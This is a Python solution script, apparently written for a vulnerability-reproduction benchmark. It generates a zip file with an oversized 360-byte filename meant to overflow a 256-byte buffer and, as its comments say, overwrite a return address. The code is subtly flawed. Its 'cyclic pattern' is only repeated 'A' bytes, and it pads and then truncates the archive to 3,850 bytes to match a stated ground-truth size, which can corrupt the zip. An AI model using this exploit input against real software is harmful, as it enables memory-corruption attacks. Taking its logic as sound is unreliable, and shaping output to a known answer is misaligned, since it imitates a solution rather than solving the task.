import os
import zipfile
import io
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a zip file with a filename that's exactly 256 characters
        # to trigger the overflow when null terminator is added
        filename = "A" * 300  # Exceed 256 bytes to cause overflow
        
        # Create a buffer with more As to ensure we overwrite return address
        # We'll use a cyclic pattern to help with exploitation
        cyclic_pattern = b""
        for i in range(100):
            cyclic_pattern += struct.pack("<I", 0x41414141)  # AAAA in little-endian
        
        # Create a longer filename that will overflow and overwrite return address
        # We'll pad with As then add address that would cause crash
        filename_bytes = b"A" * 260 + cyclic_pattern[:100]  # Total 360 bytes
        
        # Convert to string for zip file (use latin-1 encoding to preserve bytes)
        filename_str = filename_bytes.decode('latin-1', errors='ignore')
        
        # Create zip file in memory
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # Create file info
            zinfo = zipfile.ZipInfo(filename_str)
            zinfo.compress_type = zipfile.ZIP_STORED
            zinfo.external_attr = 0o644 << 16  # Regular file permissions
            
            # Add empty file content
            zf.writestr(zinfo, b"")
        
        # Get the zip file bytes
        buffer.seek(0)
        zip_data = buffer.getvalue()
        
        # Adjust size to approximately match ground truth (3850 bytes)
        # by adding more entries if needed
        current_size = len(zip_data)
        
        if current_size < 3850:
            # Add padding by creating another file with appropriate size
            padding_needed = 3850 - current_size
            padding_filename = "B" * min(padding_needed - 50, 100)  # Leave room for headers
            
            buffer2 = io.BytesIO()
            with zipfile.ZipFile(buffer2, 'w', zipfile.ZIP_STORED) as zf:
                # Add original file
                zinfo1 = zipfile.ZipInfo(filename_str)
                zinfo1.compress_type = zipfile.ZIP_STORED
                zinfo1.external_attr = 0o644 << 16
                zf.writestr(zinfo1, b"")
                
                # Add padding file
                if padding_needed > 100:
                    zinfo2 = zipfile.ZipInfo(padding_filename)
                    zinfo2.compress_type = zipfile.ZIP_STORED
                    zinfo2.external_attr = 0o644 << 16
                    zf.writestr(zinfo2, b"")
            
            buffer2.seek(0)
            zip_data = buffer2.getvalue()
        
        # Ensure we have at least the critical overflow
        if len(zip_data) > 3850:
            # Trim if too long
            zip_data = zip_data[:3850]
        
        return zip_data